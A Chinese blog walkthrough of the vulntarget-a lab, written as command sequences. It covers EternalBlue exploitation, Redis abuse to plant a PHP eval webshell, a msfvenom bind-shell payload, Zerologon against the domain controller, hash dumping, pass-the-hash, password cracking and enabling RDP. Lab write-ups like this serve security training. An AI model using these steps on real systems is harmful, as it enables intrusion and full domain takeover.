@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="vulntarget-a打靶记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-a打靶记录">
+<meta property="og:url" content="https://ja1e.github.io/2022/08/27/vulntaget-a/index.html">
+<meta property="og:site_name" content="Ja1e">
+<meta property="og:description" content="vulntarget-a打靶记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta1.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta2.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta3.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta4.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta5.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta6.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta7.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta8.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta9.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta10.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta11.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta12.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta13.png">
+<meta property="og:image" content="https://ja1e.github.io/images/vulntargeta14.png">
+<meta property="article:published_time" content="2022-08-27T08:11:33.000Z">
+<meta property="article:modified_time" content="2022-08-27T08:42:51.994Z">
+<meta property="article:author" content="Ja1e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ja1e.github.io/images/vulntargeta1.png">
+
+<link rel="canonical" href="https://ja1e.github.io/2022/08/27/vulntaget-a/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>vulntarget-a打靶记录 | Ja1e</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ja1e</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Ja1e的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2022/08/27/vulntaget-a/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ja1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ja1e">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulntarget-a打靶记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-27 16:11:33 / 修改时间：16:42:51" itemprop="dateCreated datePublished" datetime="2022-08-27T16:11:33+08:00">2022-08-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+            <div class="post-description">vulntarget-a打靶记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>靶机下载链接：</p>
+<p><strong>vulntarget域渗透靶机：</strong><a target="_blank" rel="noopener" href="https://github.com/crow821/vulntarget">crow821&#x2F;vulntarget: vulntarget靶场系列 (github.com)</a></p>
+<h1 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h1><p><img src="/images/vulntargeta1.png" alt="vulntargeta1"></p>
+<h1 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先nmap扫一波：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<p>得到win7外网机的ip：192.168.0.103</p>
+<p>然后扫这个ip：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta2.png" alt="vulntargeta2"></p>
+<p>发现443端口开放。</p>
+<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17_010"></a>ms17_010</h2><p>尝试使用永恒之蓝漏洞打，用msf：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.0.103</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到win7的shell。</p>
+<p>执行<code>ipconfig</code>命令，此处显示有两个ip地址：</p>
+<p><img src="/images/vulntargeta3.png" alt="vulntargeta3"></p>
+<p>想要攻击机能访问到10.0.20.0&#x2F;24的网段，添加一个路由，搞代理。</p>
+<h1 id="win2016"><a href="#win2016" class="headerlink" title="win2016"></a>win2016</h1><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><p>在<code>meterpreter</code>中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute	#添加路由</span><br><span class="line">run autoroute -p	#查看路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta4.png" alt="vulntargeta4"></p>
+<p>添加完路由后，当前会话可以连接到10.0.20.0&#x2F;24网段。但是我们只能在msf里连通10.0.20.0&#x2F;24网段。我们可以在msf开一个接口作为代理，让所有走这个代理的数据都可以连接到10.0.20.0&#x2F;24网段。</p>
+<h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p>开启本地代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta5.png" alt="vulntargeta5"></p>
+<p>信息不变，直接<code>run</code></p>
+<p>可以使用<code>jobs</code>查看当前是否有任务在执行，<code>jobs id -k</code>结束指定任务。</p>
+<h2 id="proxychains调用nmap"><a href="#proxychains调用nmap" class="headerlink" title="proxychains调用nmap"></a>proxychains调用nmap</h2><p>然后我们使用proxychains这个工具调用nmap扫描22网段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先修改配置文件：</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">最后一行修改为：socks5	127.0.0.1	1080</span><br><span class="line"></span><br><span class="line">调用nmap：</span><br><span class="line">proxychains4 nmap -sT -Pn 10.0.20.0/24 -p80		#有时候msf的socks5代理会抽</span><br></pre></td></tr></table></figure>
+
+<p>发现10.0.20.99主机的<code>80</code>端口和<code>6379</code>端口是开着的，先给浏览器设置代理：</p>
+<p><img src="/images/vulntargeta6.png" alt="vulntargeta6"></p>
+<p>再使用浏览器访问下 <a target="_blank" rel="noopener" href="http://10.0.20.99/">http://10.0.20.99/</a> ，是一个php页面，发现有phpinfo.php。</p>
+<p>可以发现网站的路径：C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;</p>
+<h2 id="redis未授权漏洞"><a href="#redis未授权漏洞" class="headerlink" title="redis未授权漏洞"></a>redis未授权漏洞</h2><p>在这里直接对6379的端口进行测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 redis-cli -h 10.0.20.99</span><br><span class="line">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line">config set dbfilename txx.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;txx&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>然后我们浏览器访问 <a target="_blank" rel="noopener" href="http://10.0.20.99/txx.php">http://10.0.20.99/txx.php</a> 发现一句话木马已经存在。</p>
+<h2 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h2><p>打开蚁剑，先设置代理，不然访问不到20网段。</p>
+<p><img src="/images/vulntargeta7.png" alt="vulntargeta7"></p>
+<p>然后连接，成功，并且是system权限。</p>
+<p>利用蚁剑我们可以上传文件，执行文件。</p>
+<h2 id="msf木马"><a href="#msf木马" class="headerlink" title="msf木马"></a>msf木马</h2><p>思路就是利用msf生成的木马，上传蚁剑，然后执行反弹得到meterpreter的shell。</p>
+<p>这个时候就出现了一个问题，使用正向木马还是反向木马。</p>
+<blockquote>
+<p>正向就是攻击连接受害，反向就是受害连接攻击。显然受害机没有192.168.0.0&#x2F;24的路由找不到我们的攻击机，而我们攻击机有10.0.20.0&#x2F;24的路由，就可以找到受害机。所以我们选择msf正向木马。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f exe &gt;6666.exe</span><br></pre></td></tr></table></figure>
+
+<p>生成木马，然后我们利用蚁剑把这个木马文件上传。</p>
+<p>msf打开监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rHOST 10.0.20.99</span><br><span class="line">set LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta8.png" alt="vulntargeta8"></p>
+<p>打开蚁剑的虚拟终端，执行6666.exe文件，发现msf拿到了meterpreter。（本来这里一直得不到回应的，把win2016的防火墙关了才行</p>
+<p>至此我们拿下win2016了。</p>
+<h1 id="win2019"><a href="#win2019" class="headerlink" title="win2019"></a>win2019</h1><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta9.png" alt="vulntargeta9"></p>
+<ul>
+<li>域名：vulntarget</li>
+<li>域控：win2019</li>
+<li>域控ip：10.0.10.110</li>
+</ul>
+<h2 id="路由-amp-代理"><a href="#路由-amp-代理" class="headerlink" title="路由&amp;代理"></a>路由&amp;代理</h2><p>这里发现了10的网段，和前面一样，先添加路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute	#添加路由</span><br><span class="line">run autoroute -p	#查看路由</span><br></pre></td></tr></table></figure>
+
+<p>开启本地代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后我们使用<strong>proxychains</strong>这个工具调用nmap：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先修改配置文件：</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">最后一行修改为：socks5	127.0.0.1 9999</span><br><span class="line"></span><br><span class="line">调用nmap：</span><br><span class="line">proxychains4 nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta10.png" alt="vulntargeta10"></p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>直接使用<code>CVE-2020-1472</code>（域内提权）</p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py 域控主机名 域控IP</span><br><span class="line">proxychains python3 cve-2020-1472-exploit.py win2019 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p> 此时密码已经置空</p>
+<h2 id="impacte获取hash"><a href="#impacte获取hash" class="headerlink" title="impacte获取hash"></a>impacte获取hash</h2><p>下载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br></pre></td></tr></table></figure>
+
+<p>再使用impactet来进行下一步的操作，获取域控hash</p>
+<p>cd到example目录下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py vulntarget.com/win2019\$@10.0.10.110 -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta11.png" alt="vulntargeta11"></p>
+<blockquote>
+<p>得到administrator的hash：aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</p>
+</blockquote>
+<p>哈希传递直接就拿下域控：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/vulntargeta12.png" alt="vulntargeta12"></p>
+<h2 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h2><p>把Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::写入文本文件。然后使用john破解。</p>
+<p><img src="/images/vulntargeta13.png" alt="vulntargeta13"></p>
+<p>得到明文密码：Admin@666</p>
+<h2 id="3389远程登录"><a href="#3389远程登录" class="headerlink" title="3389远程登录"></a>3389远程登录</h2><p>开启远程桌面，开启<code>3389</code>，防火墙放行<code>3389</code>，连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+
+<p>kali上就直接<code>proxychains4 rdesktop 10.0.10.110</code> </p>
+<p>账号：vulntarget.com\administrator  密码：Admin@666</p>
+<p>windows上连接：</p>
+<p>首先解决代理的问题，使用工具<strong>Proxifier</strong>。</p>
+<p>依次点击Profile–&gt;Proxy Servers–&gt;Add。Address：192.168.0.106，Port：9999，Protocol：socks5。然后ok就行。然后Profile–&gt;Proxification Rules，把Localhost前面的√取消。</p>
+<p>win+R输入mstsc，打开远程桌面连接，输入10.0.10.110，然后账号密码，连接成功。</p>
+<p><img src="/images/vulntargeta14.png" alt="vulntargeta14"></p>
+<hr>
+<p>学习链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1954759">【永久开源】vulntarget-a 打靶记录 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247486539&amp;idx=1&amp;sn=fb322e30895f081a1073ccd2642b365c&amp;chksm=cecf7673f9b8ff6539b5f44aaa186619bb039ee1014ab8d4bb7873368d0fc4aae65b82d2a499&amp;scene=178&amp;cur_album_id=2109154452740866051#rd">https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247486539&amp;idx=1&amp;sn=fb322e30895f081a1073ccd2642b365c&amp;chksm=cecf7673f9b8ff6539b5f44aaa186619bb039ee1014ab8d4bb7873368d0fc4aae65b82d2a499&amp;scene=178&amp;cur_album_id=2109154452740866051#rd</a></li>
+</ul>
+<hr>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Ja1e
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ja1e.github.io/2022/08/27/vulntaget-a/" title="vulntarget-a打靶记录">https://ja1e.github.io/2022/08/27/vulntaget-a/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/26/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/" rel="prev" title="域内横向移动">
+      <i class="fa fa-chevron-left"></i> 域内横向移动
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">拓扑结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win7"><span class="nav-number">2.</span> <span class="nav-text">win7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms17-010"><span class="nav-number">2.2.</span> <span class="nav-text">ms17_010</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win2016"><span class="nav-number">3.</span> <span class="nav-text">win2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">3.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="nav-number">3.2.</span> <span class="nav-text">开启代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proxychains%E8%B0%83%E7%94%A8nmap"><span class="nav-number">3.3.</span> <span class="nav-text">proxychains调用nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.4.</span> <span class="nav-text">redis未授权漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="nav-number">3.5.</span> <span class="nav-text">连接蚁剑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf%E6%9C%A8%E9%A9%AC"><span class="nav-number">3.6.</span> <span class="nav-text">msf木马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win2019"><span class="nav-number">4.</span> <span class="nav-text">win2019</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.1.</span> <span class="nav-text">定位域控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1-amp-%E4%BB%A3%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">路由&amp;代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1472"><span class="nav-number">4.3.</span> <span class="nav-text">CVE-2020-1472</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impacte%E8%8E%B7%E5%8F%96hash"><span class="nav-number">4.4.</span> <span class="nav-text">impacte获取hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3hash"><span class="nav-number">4.5.</span> <span class="nav-text">破解hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3389%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-number">4.6.</span> <span class="nav-text">3389远程登录</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ja1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ja1e" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:eveee428@proton.me" title="E-Mail → mailto:eveee428@proton.me" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
